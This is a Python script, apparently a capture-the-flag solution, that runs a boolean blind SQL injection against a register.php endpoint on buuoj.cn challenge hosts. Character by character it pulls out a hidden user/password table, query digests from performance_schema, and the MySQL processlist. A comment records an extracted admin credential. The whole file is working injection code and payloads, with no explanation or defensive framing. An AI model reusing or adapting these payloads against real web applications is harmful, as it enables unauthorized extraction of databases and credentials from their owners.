import requests
import time
if __name__ == '__main__':
    for a in  range(1,50):
        for i in range(130,-1,-1):
            if(i<30):
                exit(0)
            # url = "http://d49bd641-c7f4-4fed-942d-ee9ac8491fc1.node4.buuoj.cn/register.php?username=' or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e )," + str(a) + ",1)) in (" + str(i) + ")),1,0) or '0&password=12"
            #admin~glzjin666888
            #url = "http://dd75b670-cb6d-4309-ad9e-7890cb7a6ca8.node3.buuoj.cn/register.php?username=' or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in ('qwb') limit 2,1),"+str(a)+",1)) in ("+str(i)+")),1,0) or '0&password=12"
            #INSERT INTO `qwbtttaaab111e` ( `qwbqwbqwbuser` , `qwbqwbqwbpass` ) VALUES (...)
            url = "http://d49bd641-c7f4-4fed-942d-ee9ac8491fc1.node4.buuoj.cn/register.php?username=' or  if((ascii(substr((select (Info)  FROM information_schema.processlist limit 150,1),"+str(a)+",1)) in ("+str(i)+")),1,0) or '0&password=12"
            time.sleep(0.5)
            r = requests.get(url)
            if 'this username' in r.text:
                print(chr(i),end='')
                break
            else:
                if('success' in r.text):
                    pass
                else:
                    print(r.text)